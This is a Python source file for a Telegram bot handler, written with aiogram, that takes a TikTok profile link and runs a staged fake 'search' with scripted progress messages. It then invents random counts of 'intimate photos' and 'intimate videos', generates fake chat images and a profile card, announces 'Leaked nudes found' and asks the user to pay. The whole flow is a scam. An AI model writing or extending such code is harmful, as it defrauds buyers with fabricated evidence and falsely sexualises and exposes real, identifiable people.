from aiogram import Router
from aiogram.types import Message
from aiogram.filters import StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.enums.parse_mode import ParseMode
import time
from utils.easy_func import EasyFunc
from generate_photos import tiktok_photo_generate, tiktok_chats_generate
from states.states import AlSettings
from keyboards import KeyboardsCreate
import random
from get_data import get_user_data_tiktok
import logging


router_tiktok = Router()
logger_tiktok = logging.getLogger(__name__)


@router_tiktok.message(StateFilter(AlSettings.tiktok_link))
@EasyFunc.tiktok_filter()
async def tiktok_handler(message: Message, keyboards_instance: KeyboardsCreate, state: FSMContext):
    """Хэндлер колеса прогрузки тикток после успешного получения ссылки"""
    try:
        await EasyFunc.delete_last_two_messages(message)
    except Exception:
        try:
            await message.delete()
        except Exception:
            logger_tiktok.info('Не удалось удалить сообщение')
    logger_tiktok.info('Старт работы со ссылкой тикток')
    correspondence = random.randint(12, 20)
    intimate_photos = random.randint(20, 40)
    intimate_videos = random.randint(6, 10)
    info_user = None
    list_images = None
    media = None
    photo_file = None
    gg = await message.answer(f'''□□□□□□□□□□ 0%
Sending a request

They're looking for it now: 258''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜ 2%
Sending a request

They're looking for it now: 298''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜ 7%
connecting to the database

They're looking for it now: 298''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 14%
connecting to the database

They're looking for it now: 282''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️ 18%
connecting to the database

They're looking for it now: 282''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩⬜⬜️⬜️⬜️⬜️⬜️⬜ 25%
Looking for Coincidences

They're looking for it now: 233''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️⬜️ 37%
Connecting the AI

They're looking for it now: 240''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️ 49%
Checking the Coincidences

They're looking for it now: 256''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️⬜️ 57%
Connecting with MEGA

They're looking for it now: 283''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩⬜️⬜️⬜️⬜️ 66%
Connecting with MEGA

They're looking for it now: 283''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️⬜️⬜️⬜️ 74%
Connecting with tiktok.com

They're looking for it now: 274''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️⬜️⬜️⬜ 78%
Connecting with t.me

They're looking for it now: 274''')

    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️⬜️⬜️ 85%
Connecting with tiktok.com

They're looking for it now: 274''')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️⬜️⬜️ 92%
Looking deeper

They're looking for it now: 302''')
    logger_tiktok.info('Готовимся варить ссылку')
    try:
        info_user = await get_user_data_tiktok(message.text)
        if info_user:
            list_images = await tiktok_chats_generate(info_user)
            media = await EasyFunc.media_images(list_images)
    except Exception:
        logger_tiktok.info('Не удалось сварить ссылку')

    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️🟩⬜ 97%
Looking deeper

They're looking for it now: 305''')
    if info_user:
        logger_tiktok.info('Ссылка сварена')
        try:
            logger_tiktok.info('Пытаемся сгенерировать фото тикток')
            photo_file = await tiktok_photo_generate(info_user, correspondence, intimate_photos, intimate_videos)
        except Exception:
            logger_tiktok.info('Не удалось сгенерировать фото тикток')
    await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id, text='''🟩🟩🟩🟩🟩🟩🟩️🟩️🟩️🟩 100%
We're finishing up

They're looking for it now: 305''')
    if photo_file and list_images:
        logger_tiktok.info('Фотографии сгенерированы. Отправляем пользователю')
        time.sleep(1)
        markdown_text = f"[{info_user['profile_name']}]({info_user['link_profile']})"
        #print(photo_file)
        await message.bot.edit_message_text(chat_id=gg.chat.id, message_id=gg.message_id,
                                            text=f"✅ Leaked nudes found"
                                                 f"\n\n<b>{correspondence}</b> correspondence"
                                                 f"\n<b>{intimate_photos}</b> intimate photos"
                                                 f"\n<b>{intimate_videos}</b> intimate videos", parse_mode='HTML')
        await message.answer_photo(photo_file, caption=f"👤{markdown_text}", parse_mode=ParseMode.MARKDOWN)
        await message.bot.send_media_group(message.chat.id, media=media)
        await message.answer("The archives are formed. Choose a tariff and make a payment",
                             reply_markup=keyboards_instance.keyboard_payment)
        await state.set_state(AlSettings.to_pay)
    else:
        try:
            await message.bot.delete_message(chat_id=gg.chat.id, message_id=gg.message_id)
        except Exception:
            logger_tiktok.info('Не удалось удалить сообщение')
        await message.answer("Try another link to TikTok account")
        await state.set_state(AlSettings.tiktok_link)
